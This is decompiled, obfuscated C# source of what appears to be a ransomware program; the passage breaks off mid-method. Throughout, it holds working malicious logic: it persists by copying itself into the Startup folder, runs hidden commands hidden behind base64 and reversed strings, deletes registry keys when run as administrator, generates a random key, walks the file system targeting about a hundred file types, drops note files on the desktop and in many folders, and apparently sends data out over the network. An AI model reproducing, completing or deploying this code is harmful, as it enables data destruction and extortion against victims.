	public static string dkGHyHInFAxJxO;

	public static string OnFqoJGUGApWdJ;

	public static string sxBKsWEoajXbMS;

	public static string AZTVUOIWwkv;

	public static string mRnlSpySIvHv;

	public static string VNxSvOlwxaeW;

	public static string AMEITUWPLg;

	public static string hccsNgdDdQ;

	public static string GxLQadSxyiQwS;

	public static string BUGsJntHGbhi;

	public static string zaCuMfBoZEE;

	public static string AdgkTwblBwipT;

	public static string[] cYsXlGDBtenOhBicM;

	public static string LqtEdmbXXRZ;

	public static bool plkdLSPuoWcdl;

	public static string WveMusgukyqRU;

	public static bool TbNpXAhfsSvoF;

	public static bool WYYyvZugarQGbt;

	public static bool syqNcBhkAorgvFf;

	public static bool UyyQvVWUVMkr;

	public static string ggXwxjUYnLoRjW;

	public static bool zHVjUhBGwaRp;

	public static bool uLoneUjcNasYW;

	public static bool kdWGgGniuHUyqOCtL;

	public static bool XQCZKlShURRIWCk;

	public static bool YSyraIcgHbsYy;

	public static string RYHlFKZKoQLN;

	public static bool XUkiYXGJXBcCCIV;

	public static Stopwatch qPWcKfeHrpD;

	public static int XqcQqptBktg;

	public static int LyRFRlRmWuJeh;

	public static bool KOZeHLOdChFnG;

	public static string nxDmDrezAzMg;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		if (args.Length == 0 && TDOMrfSRDNtwdT == getString_0(107396958))
		{
			try
			{
				fQNmzuqkeXvewRNe CS_0024_003C_003E8__locals0 = new fQNmzuqkeXvewRNe();
				CS_0024_003C_003E8__locals0.wPozkDVtpqWgtA = Process.GetCurrentProcess().ProcessName;
				if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.wPozkDVtpqWgtA) > 1)
				{
					return;
				}
			}
			catch (Exception)
			{
			}
		}
		if (args.Length == 0 && TDOMrfSRDNtwdT == getString_0(107396958))
		{
			try
			{
				NqUkkIUPsfHDzq.PwiabXibfTTs(JPIrVFeCRgotU);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (GxLQadSxyiQwS == getString_0(107396921))
			{
				Thread thread = new Thread(SzTqONiVAX.BjqTTKvWayDo);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (PRmrECFDgTeq == getString_0(107396921))
		{
			Thread.Sleep(int.Parse(LWmXuPbBciXx));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && nMDpKOgZOyx == getString_0(107396921))
		{
			try
			{
				NBgHPanWANlrj(hIhPBIfOSm(getString_0(107396916)));
			}
			catch
			{
			}
		}
		try
		{
			if (cVkPMpQcREO == getString_0(107396921) && xGcutELFePQL.QLZEpBHfIWyDEuF())
			{
				new utunjQFNHhMFoTtd().uBuKtAEeAhzYa(bool_0: false);
				xGcutELFePQL.aHNUfvaLVsqj();
			}
		}
		catch (Exception)
		{
		}
		if (MiAyaKFsjIg == getString_0(107396921) && xGcutELFePQL.QLZEpBHfIWyDEuF())
		{
			new utunjQFNHhMFoTtd().uBuKtAEeAhzYa(bool_0: false);
			new utunjQFNHhMFoTtd().SmgmhjqfKtA();
		}
		if (xzJYEoEovCIqNw == getString_0(107396921))
		{
			YsaeTaXmVFhz.BxJfkSaAEewP();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396843);
			string text2 = text + Path.GetFileName(fileName);
			if (FjzTNiXFSgoZj == getString_0(107396921) && fileName != text2)
			{
				Thread thread2 = new Thread(ZhmtcRYwiuySf);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (nbRlreJjYNc == getString_0(107396921) && mainModule != null && fileName != text2)
			{
				try
				{
					GjqVVyxomVPsTn = BGefrDLAIpFLF(0, mFfWxNueUchlK.Count);
					File.Copy(fileName, text + mFfWxNueUchlK[GjqVVyxomVPsTn], overwrite: true);
					Process.Start(text + mFfWxNueUchlK[GjqVVyxomVPsTn]);
					SCSDvwDqJmBtg();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (jAgddAjehStg == getString_0(107396921) && DateTime.Now < OcUMIfGBdfc)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (BBPtpBucYlVlKwqBb == getString_0(107396921) && DateTime.Now > cNiAqzBRlxhj)
			{
				SCSDvwDqJmBtg();
			}
		}
		catch
		{
		}
		lmiSoVOvAAk();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> source = qWQrDBFHeAID;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						sWjtOXvcFWJH(getString_0(107392338), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> ggaVyXoqvMsv = GgaVyXoqvMsv;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						sWjtOXvcFWJH(getString_0(107392361), string_0);
					};
				}
				Parallel.ForEach(ggaVyXoqvMsv, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> ggNBPkMzCW = GgNBPkMzCW;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107392348)), string_0);
					};
				}
				Parallel.ForEach(ggNBPkMzCW, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				if (AdgkTwblBwipT == getString_0(107396921))
				{
					string[] source2 = cYsXlGDBtenOhBicM;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107392348)), getString_0(107392323) + string_0 + getString_0(107392282));
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				if (!PfYreukyJoUWR().Contains(getString_0(107393067)))
				{
					lQcOiTDWMmD(rbrkDaqDuTVbVK);
				}
				else
				{
					List<string> ppoSMzkyzp = PpoSMzkyzp;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							sWjtOXvcFWJH(hIhPBIfOSm(nTkHQcdXRpJsk(getString_0(107392277))), string_0);
						};
					}
					Parallel.ForEach(ppoSMzkyzp, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				List<string> wkxnuQfXvISBG = WkxnuQfXvISBG;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107392284)), string_0);
					};
				}
				Parallel.ForEach(wkxnuQfXvISBG, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> jmlNpNnlAKvHk = JmlNpNnlAKvHk;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						sWjtOXvcFWJH(getString_0(107392267), string_0);
					};
				}
				Parallel.ForEach(jmlNpNnlAKvHk, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && syqNcBhkAorgvFf)
			{
				try
				{
					Thread thread4 = new Thread(uCBLUMLogmvjCzai.EWqwKlEJxDtcW);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			sWjtOXvcFWJH(getString_0(107396838), hIhPBIfOSm(getString_0(107396793)));
			sWjtOXvcFWJH(getString_0(107396838), hIhPBIfOSm(getString_0(107396720)));
			sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107397175)), hIhPBIfOSm(getString_0(107397194)));
			sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107397175)), hIhPBIfOSm(getString_0(107397064)));
		}
		SecureString secureString = new SecureString();
		if (tSeKVwoVFMvVF == getString_0(107396958))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			URYiBrqszv = getString_0(107396378);
		}
		FgyHjghKYuZ = yvxyNajvQXKErrZ.nFXfHJeIPfF(qNdXlSGtStxhW(secureString));
		if (kdWGgGniuHUyqOCtL)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), RYHlFKZKoQLN)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), RYHlFKZKoQLN), string.Concat(hIhPBIfOSm(getString_0(107396333)), new WebClient().DownloadString(hIhPBIfOSm(getString_0(107396308))), getString_0(107396299), hIhPBIfOSm(getString_0(107396294)), DateTime.Now, getString_0(107396299), hIhPBIfOSm(getString_0(107396253)), FgyHjghKYuZ));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), RYHlFKZKoQLN), getString_0(107396708) + FgyHjghKYuZ);
				}
			}
			catch (Exception ex7)
			{
				if (zHVjUhBGwaRp)
				{
					try
					{
						File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107396679) + ex7.Message + getString_0(107396299));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		UxFPhdPrWsT.MBRidFZyyrmYlE(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), sxBKsWEoajXbMS), tHqDiHXNnkA(FgyHjghKYuZ), null, null, getString_0(107396598), getString_0(107396613), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			wAmkkdyfbAff();
		}
		try
		{
			OKFBognxuLrEL(new string[1] { getString_0(107396564) }, new string[100]
			{
				getString_0(107396587),
				getString_0(107396582),
				getString_0(107396577),
				getString_0(107396536),
				getString_0(107396531),
				getString_0(107396526),
				getString_0(107396553),
				getString_0(107396548),
				getString_0(107396543),
				getString_0(107396506),
				getString_0(107396501),
				getString_0(107396496),
				getString_0(107396519),
				getString_0(107396514),
				getString_0(107396473),
				getString_0(107396468),
				getString_0(107396463),
				getString_0(107396490),
				getString_0(107396485),
				getString_0(107396480),
				getString_0(107395927),
				getString_0(107395922),
				getString_0(107395917),
				getString_0(107395944),
				getString_0(107395939),
				getString_0(107395934),
				getString_0(107395897),
				getString_0(107395892),
				getString_0(107395887),
				getString_0(107395914),
				getString_0(107395909),
				getString_0(107395904),
				getString_0(107395867),
				getString_0(107395862),
				getString_0(107395853),
				getString_0(107395880),
				getString_0(107395875),
				getString_0(107395870),
				getString_0(107396553),
				getString_0(107395833),
				getString_0(107396543),
				getString_0(107395824),
				getString_0(107395851),
				getString_0(107395846),
				getString_0(107395841),
				getString_0(107395836),
				getString_0(107395799),
				getString_0(107395794),
				getString_0(107395789),
				getString_0(107395816),
				getString_0(107395811),
				getString_0(107395806),
				getString_0(107395769),
				getString_0(107395764),
				getString_0(107395759),
				getString_0(107395786),
				getString_0(107395781),
				getString_0(107395776),
				getString_0(107395735),
				getString_0(107395730),
				getString_0(107395753),
				getString_0(107395740),
				getString_0(107395833),
				getString_0(107395695),
				getString_0(107395718),
				getString_0(107395709),
				getString_0(107396180),
				getString_0(107396203),
				getString_0(107396194),
				getString_0(107396189),
				getString_0(107396148),
				getString_0(107396171),
				getString_0(107396162),
				getString_0(107396157),
				getString_0(107396120),
				getString_0(107396115),
				getString_0(107396110),
				getString_0(107396137),
				getString_0(107396132),
				getString_0(107396091),
				getString_0(107396086),
				getString_0(107396081),
				getString_0(107396076),
				getString_0(107396103),
				getString_0(107396098),
				getString_0(107396057),
				getString_0(107396048),
				getString_0(107396075),
				getString_0(107395867),
				getString_0(107396070),
				getString_0(107396065),
				getString_0(107396060),
				getString_0(107396023),
				getString_0(107396018),
				getString_0(107396041),
				getString_0(107396036),
				getString_0(107396031),
				getString_0(107395990),
				getString_0(107395985),
				getString_0(107395980)
			}, new string[0], qNdXlSGtStxhW(secureString), getString_0(107396007));
		}
		catch (Exception ex9)
		{
			if (zHVjUhBGwaRp)
			{
				try
				{
					File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107395962) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395969)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395969));
				streamWriter.WriteLine(hIhPBIfOSm(getString_0(107395424)));
				streamWriter.WriteLine(getString_0(107396299));
				streamWriter.WriteLine(hIhPBIfOSm(getString_0(107395270)));
				streamWriter.WriteLine(FgyHjghKYuZ);
				if (ofigmZpzHvUS == getString_0(107396958))
				{
					streamWriter.WriteLine(getString_0(107396299));
					streamWriter.WriteLine(hIhPBIfOSm(getString_0(107395237)) + Convert.ToString(AELBNwHYCcQQYjz.Count));
				}
				if (KOZeHLOdChFnG)
				{
					streamWriter.WriteLine(getString_0(107396299));
					streamWriter.WriteLine(hIhPBIfOSm(getString_0(107395640)));
					streamWriter.WriteLine(SVIZsHmxRViwKya.snRFPWIwbhbDozJy());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395969));
				if (!text3.Contains(FgyHjghKYuZ) && !TbNpXAhfsSvoF)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395969), getString_0(107395607) + FgyHjghKYuZ);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in jNwNlNdFEttBjzB)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395969)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395969), item + getString_0(107395969), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395969));
					if (!text4.Contains(FgyHjghKYuZ) && !TbNpXAhfsSvoF)
					{
						File.AppendAllText(item + getString_0(107395969), getString_0(107395607) + FgyHjghKYuZ);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!UyyQvVWUVMkr && num > 10)
			{
				break;
			}
		}
		if (VNxSvOlwxaeW == getString_0(107396921))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395578)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395578));
					streamWriter2.WriteLine(hIhPBIfOSm(getString_0(107395545)));
					streamWriter2.WriteLine(getString_0(107396299));
					streamWriter2.WriteLine(hIhPBIfOSm(getString_0(107395560)));
					streamWriter2.WriteLine(FgyHjghKYuZ + hIhPBIfOSm(getString_0(107395439)));
					if (ofigmZpzHvUS == getString_0(107396958))
					{
						streamWriter2.WriteLine(getString_0(107396299));
						streamWriter2.WriteLine(hIhPBIfOSm(getString_0(107395458)) + hIhPBIfOSm(getString_0(107395237)) + Convert.ToString(AELBNwHYCcQQYjz.Count) + hIhPBIfOSm(getString_0(107395439)));
					}
					if (KOZeHLOdChFnG)
					{
						streamWriter2.WriteLine(getString_0(107396299));
						streamWriter2.WriteLine(hIhPBIfOSm(getString_0(107395640)));
						streamWriter2.WriteLine(SVIZsHmxRViwKya.snRFPWIwbhbDozJy());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395969));
					if (!text5.Contains(FgyHjghKYuZ) && !TbNpXAhfsSvoF)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395578), hIhPBIfOSm(getString_0(107395458)) + getString_0(107395607) + FgyHjghKYuZ + hIhPBIfOSm(getString_0(107395439)));
					}
				}
			}
			catch
			{
			}
		}
		if (thoaXawqBaLv == getString_0(107396921))
		{
			try
			{
				if (ofigmZpzHvUS == getString_0(107396958))
				{
					SVIZsHmxRViwKya.dtnuQXnkrjRvLXZ(getString_0(107394885), getString_0(107394880), getString_0(107394835), string.Concat(hIhPBIfOSm(getString_0(107396333)), new WebClient().DownloadString(hIhPBIfOSm(getString_0(107396308))), getString_0(107394858), hIhPBIfOSm(getString_0(107396294)), DateTime.Now, getString_0(107396299), hIhPBIfOSm(getString_0(107394853)), Convert.ToString(AELBNwHYCcQQYjz.Count), getString_0(107396299), hIhPBIfOSm(getString_0(107396253)), FgyHjghKYuZ));
				}
				else
				{
					SVIZsHmxRViwKya.dtnuQXnkrjRvLXZ(getString_0(107394885), getString_0(107394880), getString_0(107394835), string.Concat(hIhPBIfOSm(getString_0(107396333)), new WebClient().DownloadString(hIhPBIfOSm(getString_0(107396308))), getString_0(107394858), hIhPBIfOSm(getString_0(107396294)), DateTime.Now, getString_0(107396299), hIhPBIfOSm(getString_0(107394853)), Convert.ToString(AELBNwHYCcQQYjz.Count), getString_0(107396299), hIhPBIfOSm(getString_0(107396253)), FgyHjghKYuZ));
				}
			}
			catch
			{
			}
		}
		if (bRwScDBJwDeBYd == getString_0(107396921))
		{
			try
			{
				ucvBxMfUmksFo.pYRLCeHbHJpYUagH(new Uri(getString_0(107394772)));
			}
			catch
			{
			}
		}
		if (VNxSvOlwxaeW == getString_0(107396958))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395969)))
				{
					Process.Start(hIhPBIfOSm(getString_0(107394771)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395969));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395578)))
				{
					Process.Start(hIhPBIfOSm(getString_0(107394746)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395578));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(eJnXTirhNcXGG))
		{
			try
			{
				File.Delete(eJnXTirhNcXGG);
			}
			catch
			{
			}
		}
		if (zHVjUhBGwaRp)
		{
			try
			{
				File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107394761));
			}
			catch (Exception)
			{
			}
		}
		if (sKzNWrhzGAHRr == getString_0(107394748))
		{
			SCSDvwDqJmBtg();
		}
	}

	public static void ZhmtcRYwiuySf()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(hIhPBIfOSm(getString_0(107394707)), hIhPBIfOSm(getString_0(107395065)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int BGefrDLAIpFLF(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> wxAPpDFvzisDT(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107395080)) && !text.Contains(getString_0(107395023)) && !text.Contains(getString_0(107394990)) && !text.ToLower().Contains(getString_0(107395005)) && !text.ToLower().Contains(getString_0(107394960)) && !text.Contains(getString_0(107394935)) && !text.Contains(getString_0(107394946)) && !text.ToLower().Contains(getString_0(107394385)) && !text.ToLower().Contains(getString_0(107394404)) && !text.ToLower().Contains(getString_0(107394367)) && !text.ToLower().Contains(getString_0(107394326)) && !text.ToLower().Contains(getString_0(107394341)) && !text.ToLower().Contains(getString_0(107394296)) && !text.ToLower().Contains(getString_0(107394315)) && !text.ToLower().Contains(getString_0(107394262)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107394269)) && !fileInfo.FullName.Contains(getString_0(107394220)) && !fileInfo.FullName.Contains(getString_0(107394203)) && !fileInfo.FullName.Contains(getString_0(107394218)) && !fileInfo.FullName.Contains(getString_0(107394169)) && !fileInfo.FullName.Contains(getString_0(107394184)) && !fileInfo.FullName.Contains(getString_0(107394647)) && !fileInfo.FullName.Contains(getString_0(107394662)) && !fileInfo.FullName.Contains(getString_0(107394617)) && !fileInfo.FullName.Contains(getString_0(107394628)) && !fileInfo.FullName.ToLower().Contains(getString_0(107394583)) && !fileInfo.FullName.ToLower().Contains(getString_0(107394602)) && !fileInfo.FullName.ToLower().Contains(getString_0(107394553)) && !fileInfo.FullName.ToLower().Contains(getString_0(107394568)) && !fileInfo.FullName.Contains(hIhPBIfOSm(getString_0(107394519))) && !fileInfo.FullName.Contains(getString_0(107394526)) && !fileInfo.FullName.Contains(getString_0(107394481)) && !fileInfo.FullName.Contains(getString_0(107394496)) && !fileInfo.FullName.EndsWith(getString_0(107396007)) && !fileInfo.FullName.EndsWith(getString_0(107394471)) && !fileInfo.FullName.EndsWith(getString_0(107394466)) && !fileInfo.FullName.EndsWith(getString_0(107394461)) && !fileInfo.FullName.EndsWith(getString_0(107394424)) && !fileInfo.FullName.Contains(getString_0(107394419)) && !fileInfo.FullName.Contains(sxBKsWEoajXbMS) && !fileInfo.FullName.Contains(ggXwxjUYnLoRjW) && !fileInfo.FullName.Contains(RYHlFKZKoQLN))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(pmJIDUymRvUZ) * 1024.0 * 1024.0 && meUKxegfAGyfS == getString_0(107396921))
						{
							list.Add(fileInfo.FullName);
							LBsveUxeJuFpx(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && meUKxegfAGyfS == getString_0(107396958))
						{
							list.Add(fileInfo.FullName);
							LBsveUxeJuFpx(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string sWjtOXvcFWJH(string AsFZWpqdLKY = "", string KqZUYLvlclVtW = "")
	{
		string result = getString_0(107394772);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = AsFZWpqdLKY,
				Arguments = KqZUYLvlclVtW,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void NBgHPanWANlrj(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107394434),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string nTkHQcdXRpJsk(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string hIhPBIfOSm(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void lQcOiTDWMmD(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = hIhPBIfOSm(getString_0(107393873));
		processStartInfo.Arguments = getString_0(107393844) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool coEAEokiZKEV(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string qNdXlSGtStxhW(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void lmiSoVOvAAk()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = nTkHQcdXRpJsk(getString_0(107393839));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(hIhPBIfOSm(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(hIhPBIfOSm(getString_0(107393733)));
					registryKey.DeleteSubKey(hIhPBIfOSm(getString_0(107393676)));
					registryKey.DeleteSubKey(hIhPBIfOSm(getString_0(107393659)));
					registryKey.DeleteSubKey(hIhPBIfOSm(getString_0(107393666)));
					registryKey.DeleteSubKey(hIhPBIfOSm(getString_0(107393873)));
					registryKey.DeleteSubKey(hIhPBIfOSm(getString_0(107394153)));
					registryKey.DeleteSubKey(hIhPBIfOSm(getString_0(107394092)));
					registryKey.Close();
				}
				string_ = nTkHQcdXRpJsk(getString_0(107394075));
				registryKey = Registry.LocalMachine.OpenSubKey(hIhPBIfOSm(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(hIhPBIfOSm(getString_0(107393978)));
					registryKey.Close();
				}
				string_ = nTkHQcdXRpJsk(getString_0(107393993));
				registryKey = Registry.LocalMachine.OpenSubKey(hIhPBIfOSm(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(hIhPBIfOSm(getString_0(107393978)));
					registryKey.Close();
				}
				string_ = nTkHQcdXRpJsk(getString_0(107393993));
				registryKey = Registry.CurrentUser.OpenSubKey(hIhPBIfOSm(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(hIhPBIfOSm(getString_0(107393978)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107393944)), hIhPBIfOSm(getString_0(107393959)));
			sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107393366)), hIhPBIfOSm(getString_0(107393357)));
			sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107393366)), hIhPBIfOSm(getString_0(107393211)));
			sWjtOXvcFWJH(hIhPBIfOSm(getString_0(107393182)), hIhPBIfOSm(getString_0(107393133)));
		}
		catch
		{
		}
	}

	public static void eCfTjekYzSTzH(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(hIhPBIfOSm(getString_0(107393604)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
